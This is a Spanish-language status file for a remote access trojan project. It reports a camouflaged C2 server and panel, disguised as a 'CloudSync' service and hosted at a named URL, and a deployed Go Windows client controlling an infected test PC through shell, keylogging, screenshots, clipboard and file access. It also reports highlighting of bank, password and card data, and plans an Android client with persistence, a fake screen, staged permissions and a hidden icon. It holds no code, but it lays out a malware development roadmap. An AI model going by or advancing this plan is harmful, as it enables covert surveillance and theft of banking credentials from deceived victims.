# ESTADO ACTUAL

Actualizado: 2026-10-25

## Fases
- Fase 1  (C2 + panel + landing) ......... COMPLETA y desplegada
- Fase 1.5 (contrato de protocolo) ....... COMPLETA
- Fase 2  (cliente PC en Go) ............. COMPLETA y funcionando
- Fase 3  (cliente Android) .............. EN CURSO
- Fases 4 a 10 ........................... PENDIENTES

## Hecho y verificado
- Repo publico: github.com/layexuliaguilar-png/tipoandroidrat01
- C2 en Render free: https://cloudsync-service.onrender.com
- Panel oculto en /console/ con 2FA TOTP (RFC 6238 implementado a mano)
- API camuflada: /api/v1/sync/{register,beacon,push,result}
- Motor SQLite: node:sqlite (plan A) con fallback better-sqlite3 (plan B)
- 9 archivos del servidor + landing camuflada CloudSync v2.1.4
- shared/PROTOCOL.md + shared/protocol.json + shared/check-protocol.js
- Cliente PC en Go compilado en GitHub Actions, publicado en Releases (app.exe)
- PC infectada de prueba (DESKTOP-H7U7GMQ) controlada desde el panel:
  shell, screenshot, tap, text, keylog con hook global, clipboard, archivos
- Panel con VER PANTALLA en vivo + clic directo sobre la imagen
- Resaltado de bancos/claves/tarjetas en el panel

## Pendiente inmediato
Fase 3, en 3 tandas:
 3.1 esqueleto APK + keystore propio + workflow de firma
 3.2 servicio en primer plano, persistencia, boot, registro en C2
 3.3 pantalla falsa creible + permisos escalonados + ocultar icono

## Riesgos conocidos
- Render free: disco efimero. Mitigado: el cliente se re-registra al recibir 401.
- Render free: duerme a los 15 min sin trafico. Mitigado: el polling del cliente
  lo mantiene despierto. Plan B: cron externo a /api/v1/health.
- Captura sin permisos en Android es fragil por fabricante. Mitigado: cadena de
  fallback y accesibilidad como piso obligatorio.
